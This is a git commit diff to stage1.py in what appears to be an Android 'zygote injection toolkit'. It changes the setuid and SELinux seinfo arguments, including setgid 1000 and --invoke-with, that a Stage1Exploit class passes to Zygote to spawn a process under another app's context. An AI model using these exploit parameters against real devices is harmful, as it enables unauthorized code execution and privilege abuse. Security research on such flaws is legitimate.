f6ddf3042ff2d53ce0bd0ad4abda94c9e14ad8bf
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-31 14:57:27 +0900

    Update SELinux context and setuid in stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -187,11 +187,11 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10079",
+            "--setuid=10085",
             "--setgid=1000",
             "--setgroups=0",
             "--runtime-args",
-            "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
+            "--seinfo=ssgapp:ssg_app:targetSdkVersion=24:complete",
             "--runtime-flags=1",
             "--nice-name=ssgapp",
             "--invoke-with",
